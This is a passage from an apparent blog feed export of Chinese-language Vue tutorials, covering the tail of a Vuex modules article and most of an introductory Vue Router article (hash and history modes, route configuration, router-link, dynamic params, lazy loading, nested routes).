这里使用了解构赋值，context.state context.commit context.rootState</span></span><br><span class="line">  actions: &#123;</span><br><span class="line">    incrementIfOddOnRootSum (&#123; state, commit, rootState &#125;) &#123;</span><br><span class="line">      <span class="keyword">if</span> ((state.count + rootState.count) % <span class="number">2</span> === <span class="number">1</span>) &#123;</span><br><span class="line">        commit(<span class="string">'increment'</span>)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于模块内部的 getter，根节点状态会作为第三个参数暴露出来：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> moduleA = &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  getters: &#123;</span><br><span class="line">    sumWithRootCount (state, getters, rootState) &#123;</span><br><span class="line">      <span class="keyword">return</span> state.count + rootState.count</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意</strong>：虽然我们的一些mutation和action都是定义在module对象内部的，但是在调用的时候, 依然是通过this.$store来直接调用的.</p><h1 id="项目结构"><a href="#项目结构" class="headerlink" title="项目结构"></a>项目结构</h1><p>Vuex 并不限制你的代码结构。但是，它规定了一些需要遵守的规则：</p><ol><li>应用层级的状态应该集中到单个 store 对象中。</li><li>提交 <strong>mutation</strong> 是更改状态的唯一方法，并且这个过程是同步的。</li><li>异步逻辑都应该封装到 <strong>action</strong> 里面。</li></ol><p>只要你遵守以上规则，如何组织代码随你便。如果你的 store 文件太大，只需将 action、mutation 和 getter 分割到单独的文件。</p><p>对于大型应用，我们会希望把 Vuex 相关代码分割到模块中。下面是项目结构示例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">├── index.html</span><br><span class="line">├── main.js</span><br><span class="line">├── api</span><br><span class="line">│   └── ... <span class="comment"># 抽取出API请求</span></span><br><span class="line">├── components</span><br><span class="line">│   ├── App.vue</span><br><span class="line">│   └── ...</span><br><span class="line">└── store</span><br><span class="line">    ├── index.js          <span class="comment"># 我们组装模块并导出 store 的地方</span></span><br><span class="line">    ├── actions.js        <span class="comment"># 根级别的 action</span></span><br><span class="line">    ├── mutations.js      <span class="comment"># 根级别的 mutation</span></span><br><span class="line">    └── modules</span><br><span class="line">        ├── cart.js       <span class="comment"># 购物车模块</span></span><br><span class="line">        └── products.js   <span class="comment"># 产品模块</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vue </tag>
            
            <tag> Vue入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>六、Vue Router入门</title>
      <link href="/2021/03/01/%E5%85%AD%E3%80%81Vue%20Router%E5%85%A5%E9%97%A8/"/>
      <url>/2021/03/01/%E5%85%AD%E3%80%81Vue%20Router%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p><a href="https://router.vuejs.org/zh/" target="_blank" rel="noopener">官方介绍</a></p><blockquote><p>Vue Router 是 <a href="http://cn.vuejs.org/" target="_blank" rel="noopener">Vue.js</a> 官方的路由管理器。它和 Vue.js 的核心深度集成，让构建单页面应用变得易如反掌。包含的功能有：</p><ul><li>嵌套的路由/视图表</li><li>模块化的、基于组件的路由配置</li><li>路由参数、查询、通配符</li><li>基于 Vue.js 过渡系统的视图过渡效果</li><li>细粒度的导航控制</li><li>带有自动激活的 CSS class 的链接</li><li>HTML5 历史模式或 hash 模式，在 IE9 中自动降级</li><li>自定义的滚动条行为</li></ul></blockquote><h1 id="路由器"><a href="#路由器" class="headerlink" title="路由器"></a>路由器</h1><p>谈到路由，大多数人首先会想到还是路由器，上一下百度一下对于路由器的介绍</p><blockquote><p>路由器是连接两个或多个网络的硬件设备，在网络间起<a href="https://baike.baidu.com/item/网关/98992" target="_blank" rel="noopener">网关</a>的作用，是读取每一个数据包中的地址然后决定如何传送的专用智能性的网络设备。它能够理解不同的协议，例如某个局域网使用的以太网协议，因特网使用的<a href="https://baike.baidu.com/item/TCP%2FIP/214077" target="_blank" rel="noopener">TCP/IP</a>协议。这样，路由器可以分析各种不同类型网络传来的数据包的目的地址，把非TCP/IP网络的地址转换成TCP/IP地址，或者反之；再根据选定的<a href="https://baike.baidu.com/item/路由算法/2709757" target="_blank" rel="noopener">路由算法</a>把各数据包按最佳路线传送到指定位置。所以路由器可以把非TCP/ IP网络连接到<a href="https://baike.baidu.com/item/因特网/114119" target="_blank" rel="noopener">因特网</a>上。</p></blockquote><p>简单来说：<strong>路由</strong>（<strong>routing</strong>）就是通过互联的网络把信息从源地址传输到目的地址的活动(来自维基百科)</p><p>可能没听懂，没事</p><p>你只需要通过一张图来理解一下他的作用</p><p>![image-20200928102611806](六、Vue Router入门/image-20200928102611806.png)</p><p>最后来解释下这张图并总结一下</p><ol><li><p>路由器提供了两种机制: <strong>路由和转送</strong>.</p><ul><li>路由是决定数据包从<strong>来源</strong>到<strong>目的地</strong>的路径.</li><li>转送将<strong>输入端</strong>的数据转移到合适的<strong>输出端</strong>.</li></ul></li><li><p>路由中有一个非常重要的概念叫路由表.</p><ul><li>路由表本质上就是一个映射表, 决定了数据包的指向</li></ul></li></ol><h1 id="后端路由阶段"><a href="#后端路由阶段" class="headerlink" title="后端路由阶段"></a>后端路由阶段</h1><p>早期的网站开发整个HTML页面是由服务器来渲染的。服务器直接生产渲染好对应的HTML页面, 返回给客户端进行展示.</p><p>服务器直接生产渲染好对应的HTML页面, 返回给客户端进行展示.</p><p>每个页面都有自己对应的一个url地址，用户输入一个url地址，然后这个url会传给服务器，服务器通过对url进行解析匹配，交给一个Controller处理，然后它就会去找对应的资源（html、css、js），然后服务器再在这上面通过对数据库数据的拿取后进行数据渲染，然后再将整个页面发送给前端</p><p>这样的好处是不需要单独加载js和css，直接给浏览器渲染，有利于SEO的优化</p><p>但也有缺点，你会发现，整个过程前端几乎不需要做什么事情，可能就是将静态页面写出来。然后放在一个静态资源服务器上（下面有图介绍），然后，后端人员就悲剧了，他们要去读html页面，然后去数据库拿数据，再然后将数据填充到html页面上，不仅增加了后端人员的负担，同时也使html和对应的数据处理逻辑混在一起，难以编写和维护</p><p>![image-20200928105140370](六、Vue Router入门/image-20200928105140370.png)</p><h1 id="前端路由阶段"><a href="#前端路由阶段" class="headerlink" title="前端路由阶段"></a>前端路由阶段</h1><p>随着Ajax的出现，有了前后端分离的开发模式</p><p>后端只需要提供API来返回给前端数据，然后前端通过Ajax来获取数据，然后通过相应的js代码将数据渲染到页面中</p><p>这样做有一个明显的优点，后端压力小了，他只负责从数据库调取数据，处理数据和业务逻辑，而前端就可以注重交互和可视化UI上，最后将后端传过来的数据进行页面填充</p><p>随着这个过程的发展，就出现了<strong>单页面富应用阶段（SPA）</strong></p><p>它的本质就是，在前后端分离的基础上，出现前端路由，它主要有以下特点</p><ul><li>url刷新后，页面不进行整体上的刷新</li><li>整个网站可能只有一个页面</li></ul><p>它通过映射的方式，将整个html、css、js文件抽离开来，像之前学习的那样，抽离出一个个VUE组件，再通过不同的url去映射不同的vue组件</p><p>![](六、Vue Router入门/image-20200928105707350.png)</p><p>那么怎么实现多次url改变，只在一个页面上刷新呢，有两种方式，一个是通过url的hash，另一个是html5的history</p><p>先说说url的hash</p><ul><li>URL的hash也就是锚点(#), 本质上是改变indow.location的href属性.</li><li>我们可以通过直接赋值location.hash来改变href, 但是页面不发生刷新</li><li>location.hash = ‘url地址’</li></ul><p>history接口是HTML5新增的, 它有五种模式改变URL而不刷新页面，下面其常用的方法</p><ol><li><p>history.pushState({data},’title’,’url’)</p><p>将url推入（注意：这里采用类似栈的形式压入url）</p></li><li><p>history.back()</p><p>返回上一级url，类似出栈(可以联想下app还有小程序的操作模式)</p><p>等同于history.go(-1)</p></li><li><p>history.replaceState({data},’title’,’url’)</p><p>重新指定url，这里要注意，它不能返回到上一级url，这是他和pushState的区别</p></li><li><p>history.go(n)</p><p>弹出（-n）和压入（n）的url个数</p><p>也就是需要跳转多少级url</p></li><li><p>history.forward()</p><p>等同于history.go(1)</p></li></ol><h1 id="安装和配置"><a href="#安装和配置" class="headerlink" title="安装和配置"></a>安装和配置</h1><p>在CLI安装的时候将router这个选项选上，就会安装上了</p><p>如果没安装上，但是在后来的项目中需要用到，那么直接通过npm安装即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install vue-router --save</span><br></pre></td></tr></table></figure><p>然后，如果你是通过脚手架安装的话，在项目文件夹下的src里面默认会创建一个router文件夹，里面有一个index.js文件，他是关于路由相关配置</p><h1 id="使用步骤"><a href="#使用步骤" class="headerlink" title="使用步骤"></a>使用步骤</h1><ol><li>配置路由<ol><li>导入路由对象</li><li>创建路由实例，传入路由映射配置</li><li>在Vue实例中挂载创建的路由实例</li></ol></li><li>创建路由组件</li><li>配置组件和路径的映射关系</li><li>使用路由</li></ol><p>对每一步进行详细说明</p><p>第一步：导入路由对象，并且在vue中安装路由功能</p><ol><li>导入Vue和VueRouter</li><li>在vue中安装路由（<code>Vue.use(VueRouter)</code>）</li><li>定义路由映射表（<code>const routes = []</code>）</li><li>实例化路由对象并将映射表挂载上去（<code>const router = new VueRouter()</code>）</li><li>导出路由对象（<code>export default router</code>）</li><li>在main.js，Vue实例中挂载创建的路由实例</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//导入Vue和VueRouter</span></span><br><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">'vue'</span></span><br><span class="line"><span class="keyword">import</span> VueRouter <span class="keyword">from</span> <span class="string">'vue-router'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//在vue中安装路由</span></span><br><span class="line">Vue.use(VueRouter)</span><br><span class="line"></span><br><span class="line"><span class="comment">//定义路由映射表</span></span><br><span class="line"><span class="keyword">const</span> routes = [] <span class="comment">//路由映射的地方</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//实例化路由对象并将映射表挂载上去</span></span><br><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> VueRouter(&#123;</span><br><span class="line">  routes, <span class="comment">//将路由映射表挂载在路由实例上</span></span><br><span class="line">  mode: <span class="string">'history'</span>,<span class="comment">//将hash改为history，防止因为hash的原因url有#出现</span></span><br><span class="line">  linkActiveClass: <span class="string">'active'</span>, <span class="comment">//将路由默认的触发class改为自定义类名</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//导出路由对象</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> router</span><br></pre></td></tr></table></figure><p>main.js文件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> router <span class="keyword">from</span> <span class="string">'./router'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Vue(&#123;</span><br><span class="line">  router, <span class="comment">//挂载路由对象</span></span><br><span class="line">  render: <span class="function"><span class="params">h</span> =&gt;</span> h(App)</span><br><span class="line">&#125;).$mount(<span class="string">'#app'</span>)</span><br></pre></td></tr></table></figure><p>第二步和第三步：创建路由实例，这一步思路较为简单，就是在src下的views文件夹里创建vue文件，定义自己的模板，然后再index.js里面的路由映射表里填入该vue文件的映射路由</p><p>![image-20200928145318277](六、Vue Router入门/image-20200928145318277.png)</p><p>index.js代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> routes = [</span><br><span class="line"></span><br><span class="line">  <span class="comment">//路由默认设置</span></span><br><span class="line">  &#123;</span><br><span class="line">    path:<span class="string">''</span>,</span><br><span class="line">    redirect:<span class="string">'/home'</span>,</span><br><span class="line">    component: Home</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    path: <span class="string">'/home'</span>,</span><br><span class="line">    name: <span class="string">'Home'</span>,</span><br><span class="line">    component: Home</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    path: <span class="string">'/about'</span>,</span><br><span class="line">    name: <span class="string">'About'</span>,    <span class="comment">// route level code-splitting</span></span><br><span class="line">    <span class="comment">// this generates a separate chunk (about.[hash].js) for this route</span></span><br><span class="line">    <span class="comment">// which is lazy-loaded when the route is visited.</span></span><br><span class="line">    <span class="comment">//这个方法样式渲染不出来</span></span><br><span class="line">    <span class="comment">// component: () =&gt; import(/* webpackChunkName: "about" */ '../views/About.vue')</span></span><br><span class="line">    component: About</span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>第四步：就是在App.vue主节点下，通过<router-link>和<router-view>标签去使用路由了</router-view></router-link></p><p>注意：</p><ul><li><p><router-link>标签是一个vue-router中已经内置的组件, 它会被渲染成一个<a>标签.</a></router-link></p></li><li><p><router-view>标签会根据当前的路径, 动态渲染出不同的组件.</router-view></p></li><li><p>网页的其他内容, 比如顶部的标题/导航, 或者底部的一些版权信息等会和<router-view>处于同一个等级.</router-view></p></li><li><p>在路由切换时, 切换的是<router-view>挂载的组件, 其他内容不会发生改变.</router-view></p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;h1&gt;我是首页&lt;&#x2F;h1&gt;</span><br><span class="line">    &lt;!-- 方法一：通过router绑定的空间实现路由跳转 --&gt;</span><br><span class="line">    &lt;router-link to&#x3D;&quot;&#x2F;home&quot;&gt;首页&lt;&#x2F;router-link&gt;</span><br><span class="line">    &lt;router-link to&#x3D;&quot;&#x2F;about&quot;&gt;关于&lt;&#x2F;router-link&gt;</span><br><span class="line">    &lt;router-view class&#x3D;&quot;vvv&quot;&gt;&lt;&#x2F;router-view&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;template&gt;</span><br></pre></td></tr></table></figure><p>效果如下</p><p>![image-20200928152010528](六、Vue Router入门/image-20200928152010528.png)</p><h1 id="路由的默认路径"><a href="#路由的默认路径" class="headerlink" title="路由的默认路径"></a>路由的默认路径</h1><p>如果希望进入首页的时候默认直接显示首页路由，而不是点击首页才会出现，你可以在router下的index.js文件做这样的配置</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> routes = [</span><br><span class="line">  <span class="comment">//路由默认设置</span></span><br><span class="line">  &#123;</span><br><span class="line">    path:<span class="string">''</span>,</span><br><span class="line">    redirect:<span class="string">'/home'</span>,</span><br><span class="line">    component: Home</span><br><span class="line">  &#125;,</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h1 id="HTML5的history模式"><a href="#HTML5的history模式" class="headerlink" title="HTML5的history模式"></a>HTML5的history模式</h1><p>如果你希望路径中不出现#，那么你可以在创建router实例中，通过mode将路径从hash改成history</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> VueRouter(&#123;</span><br><span class="line">  routes,</span><br><span class="line">  mode: <span class="string">'history'</span>,<span class="comment">//将hash改为history，防止url有#出现</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h1 id="router-link其它属性"><a href="#router-link其它属性" class="headerlink" title="router-link其它属性"></a>router-link其它属性</h1><p>tag: tag可以指定<router-link>之后渲染成什么标签格式的组件</router-link></p><p>replace: replace不会留下history记录, 所以指定replace的情况下, 后退键返回不能返回到上一个页面中</p><p>active-class: 当<router-link>对应的路由匹配成功时, 会自动给当前元素设置一个router-link-active的class, 设置active-class可以修改默认的名称.</router-link></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;h1&gt;我是首页&lt;&#x2F;h1&gt;</span><br><span class="line">    &lt;!-- 方法一：通过router绑定的空间实现路由跳转 --&gt;</span><br><span class="line">    &lt;!-- &lt;router-link to&#x3D;&quot;&#x2F;home&quot;&gt;首页&lt;&#x2F;router-link&gt;</span><br><span class="line">    &lt;router-link to&#x3D;&quot;&#x2F;about&quot;&gt;关于&lt;&#x2F;router-link&gt; --&gt;</span><br><span class="line">    &lt;router-view class&#x3D;&quot;vvv&quot;&gt;&lt;&#x2F;router-view&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- 取消返回 以及自定义标签--&gt;</span><br><span class="line">     &lt;router-link to&#x3D;&quot;&#x2F;home&quot; replace tag&#x3D;&quot;button&quot;&gt;首页&lt;&#x2F;router-link&gt;</span><br><span class="line">    &lt;router-link to&#x3D;&quot;&#x2F;about&quot; replace tag&#x3D;&quot;button&quot;&gt;关于&lt;&#x2F;router-link&gt;</span><br><span class="line"></span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;template&gt;</span><br></pre></td></tr></table></figure><p>通过<strong>linkActiveClass</strong>可以更改全局点击是触发的class名</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> VueRouter(&#123;</span><br><span class="line">  routes,</span><br><span class="line">  mode: <span class="string">'history'</span>,<span class="comment">//将hash改为history，防止url有#出现</span></span><br><span class="line">  linkActiveClass: <span class="string">'active'</span>, <span class="comment">//将路由默认的触发class改为自定义类名</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h1 id="代码实现路由跳转"><a href="#代码实现路由跳转" class="headerlink" title="代码实现路由跳转"></a>代码实现路由跳转</h1><p>核心就是通过<code>$router.push(&#39;url&#39;)</code>或<code>$router.replace(&#39;url&#39;)</code>来实现路由跳转</p><p>通过@click绑定点击事件从而代码上实现路由跳转</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;h1&gt;我是首页&lt;&#x2F;h1&gt;</span><br><span class="line">    &lt;!-- 方法一：通过router绑定的空间实现路由跳转 --&gt;</span><br><span class="line">    &lt;!-- &lt;router-link to&#x3D;&quot;&#x2F;home&quot;&gt;首页&lt;&#x2F;router-link&gt;</span><br><span class="line">    &lt;router-link to&#x3D;&quot;&#x2F;about&quot;&gt;关于&lt;&#x2F;router-link&gt; --&gt;</span><br><span class="line">    &lt;router-view class&#x3D;&quot;vvv&quot;&gt;&lt;&#x2F;router-view&gt;</span><br><span class="line">    &lt;!-- 方法二：通过代码实现 --&gt;</span><br><span class="line">    &lt;button @click&#x3D;&quot;homeClick&quot;&gt;首页&lt;&#x2F;button&gt;</span><br><span class="line">    &lt;button @click&#x3D;&quot;aboutClick&quot;&gt;关于&lt;&#x2F;button&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">  name: &#39;App&#39;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    homeClick() &#123;</span><br><span class="line">      &#x2F;&#x2F; this.$router.push(&#39;&#x2F;home&#39;)</span><br><span class="line">      this.$router.replace(&#39;&#x2F;home&#39;) &#x2F;&#x2F;禁止返回上一个页面</span><br><span class="line">    &#125;,</span><br><span class="line">    aboutClick() &#123;</span><br><span class="line">      &#x2F;&#x2F; this.$router.push(&#39;&#x2F;about&#39;)</span><br><span class="line">      this.$router.replace(&#39;&#x2F;about&#39;) &#x2F;&#x2F;禁止返回上一个页面</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h1 id="动态路由（params）"><a href="#动态路由（params）" class="headerlink" title="动态路由（params）"></a>动态路由（params）</h1><p>有时候，我们可能需要根据每个用户的id或者其它唯一标识符去跳转到该用户的详细信息页面，如a用户/user/a，b用户user/b，这个时候我们就需要用到动态路由去实现这一功能，如下代码所示</p><p>router: index.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  path: <span class="string">'/user/:userid'</span>,</span><br><span class="line">  name: <span class="string">'User'</span>,</span><br><span class="line">  component: User,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>App.vue</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;h1&gt;我是首页&lt;&#x2F;h1&gt;</span><br><span class="line">    &lt;router-link :to&#x3D;&quot;&#39;&#x2F;user&#x2F;&#39;+ userid&quot; tag&#x3D;&quot;button&quot;&gt;用户&lt;&#x2F;router-link&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">  name: &#39;App&#39;,</span><br><span class="line">  data() &#123;</span><br><span class="line">    return &#123;</span><br><span class="line">      userid: &#39;123&#39;      </span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    userClick() &#123;</span><br><span class="line">      this.$router.push(&#39;&#x2F;user&#x2F;&#39;+this.userid)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure><p>User.vue（获取该id）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1&gt;lalala，我叫&#123;&#123;$route.params.userid&#125;&#125;&lt;&#x2F;h1&gt;</span><br></pre></td></tr></table></figure><h1 id="路由懒加载"><a href="#路由懒加载" class="headerlink" title="路由懒加载"></a>路由懒加载</h1><p>官方简介：</p><blockquote><p>当打包构建应用时，JavaScript 包会变得非常大，影响页面加载。如果我们能把不同路由对应的组件分割成不同的代码块，然后当路由被访问的时候才加载对应组件，这样就更加高效了。</p><p>结合 Vue 的<a href="https://cn.vuejs.org/v2/guide/components-dynamic-async.html#异步组件" target="_blank" rel="noopener">异步组件</a>和 Webpack 的<a href="https://doc.webpack-china.org/guides/code-splitting-async/#require-ensure-/" target="_blank" rel="noopener">代码分割功能</a>，轻松实现路由组件的懒加载。</p></blockquote><p>官方的意思是什么呢，当我们打包一个项目时，它会将整个项目打包成一个js文件，所以当我们加载一个页面时，她都会去加载整个js文件，这样会带给服务器一定的压力，也可能会造成请求下来的过程中，界面发生短暂空白，所以将每一个页面对应的文件分开，如果需要加载该页面时，再去加载它，这样就可以避免上面的情况发生了</p><p>在之前，router加载vue文件时，是通过这个方式</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Home <span class="keyword">from</span> <span class="string">'../views/Home.vue'</span></span><br><span class="line"><span class="keyword">import</span> About <span class="keyword">from</span> <span class="string">'../views/About.vue'</span></span><br><span class="line"><span class="keyword">import</span> User <span class="keyword">from</span> <span class="string">'../views/User.vue'</span></span><br></pre></td></tr></table></figure><p>通过路由懒加载后，就变成这样子</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> Home = <span class="function"><span class="params">()</span> =&gt;</span> <span class="keyword">import</span>(<span class="string">'../views/Home.vue'</span>)</span><br><span class="line"><span class="keyword">const</span> About = <span class="function"><span class="params">()</span> =&gt;</span> <span class="keyword">import</span>(<span class="string">'../views/About.vue'</span>)</span><br><span class="line"><span class="keyword">const</span> User = <span class="function"><span class="params">()</span> =&gt;</span> <span class="keyword">import</span>(<span class="string">'../views/User.vue'</span>)</span><br></pre></td></tr></table></figure><p>打包后你就发现，js文件被分成了多个</p><p>当然，懒加载有多个方式，主要有三种</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.</span></span><br><span class="line"><span class="keyword">const</span> Home = <span class="function"><span class="params">resolve</span> =&gt;</span> &#123; <span class="built_in">require</span>.ensure([<span class="string">'../components/Home.vue'</span>], () =&gt; &#123; resolve(<span class="built_in">require</span>(<span class="string">'../components/Home.vue'</span>)) &#125;)&#125;</span><br><span class="line"><span class="comment">//2.</span></span><br><span class="line"><span class="keyword">const</span> About = <span class="function"><span class="params">resolve</span> =&gt;</span> <span class="built_in">require</span>([<span class="string">'../components/About.vue'</span>], resolve)</span><br><span class="line"><span class="comment">//3.</span></span><br><span class="line"><span class="keyword">const</span> Home = <span class="function"><span class="params">()</span> =&gt;</span> <span class="keyword">import</span>(<span class="string">'../components/Home.vue'</span>)</span><br></pre></td></tr></table></figure><h1 id="路由嵌套"><a href="#路由嵌套" class="headerlink" title="路由嵌套"></a>路由嵌套</h1><p><a href="https://router.vuejs.org/zh/guide/essentials/nested-routes.html" target="_blank" rel="noopener">官方介绍</a>:</p><p>实际生活中的应用界面，通常由多层嵌套的组件组合而成。同样地，URL 中各段动态路径也按某种结构对应嵌套的各层组件，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span 